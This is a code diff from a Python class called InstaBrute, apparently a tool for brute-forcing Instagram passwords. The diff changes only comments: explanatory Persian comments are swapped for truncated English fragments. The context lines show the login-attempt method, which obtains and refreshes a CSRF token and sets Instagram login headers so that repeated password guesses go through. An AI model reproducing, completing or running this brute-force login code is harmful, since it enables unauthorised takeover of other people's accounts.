@@ -73,14 +73,14 @@ class InstaBrute:
         return csrf
 
     def try_login(self, password):
-        # فقط یکبار csrf token بگیر
+        # CSRF 
         if not self.csrf_token:
             self.csrf_token = self.get_csrf_token()
             if not self.csrf_token:
                 print("[!] CSRF token not found. Skipping this attempt.")
                 return False
 
-        # آپدیت هدرها با csrf token
+        # csrf token
         self.session.headers.update({
             'X-CSRFToken': self.csrf_token,
             'Referer': 'https://www.instagram.com/accounts/login/',
@@ -101,7 +101,7 @@ class InstaBrute:
             print(f"[!] Request failed: {e}")
             return False
 
-        # بروز رسانی csrf token از کوکی‌ها بعد هر لاگین
+        # csrf 
         self.csrf_token = res.cookies.get('csrftoken', self.csrf_token)
 
         try:
